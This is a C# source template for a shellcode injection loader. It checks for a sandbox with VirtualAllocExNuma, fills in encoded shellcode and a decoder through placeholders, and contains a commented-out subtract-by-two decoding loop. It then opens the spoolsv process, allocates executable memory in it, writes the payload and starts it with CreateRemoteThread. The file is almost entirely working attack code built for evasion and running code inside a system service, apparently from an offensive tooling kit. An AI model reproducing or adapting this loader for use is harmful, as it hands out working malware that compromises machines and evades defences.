using System; 
using System.Runtime.InteropServices; 
using System.Diagnostics;

namespace Inject 
{ 
	class Program 
		{ 
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); 
		
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
		static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		
		[DllImport("kernel32.dll")] 
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten); 
		
		[DllImport("kernel32.dll")] 
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
		
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
            
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

		static void Main(string[] args) 
		{ 
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            %ENCSHELLCODE%

            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            //}

            %DECODER%

            int size = buf.Length;
            Process[] expProc = Process.GetProcessesByName("spoolsv");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
            IntPtr.Zero);
        } 
    } 
}





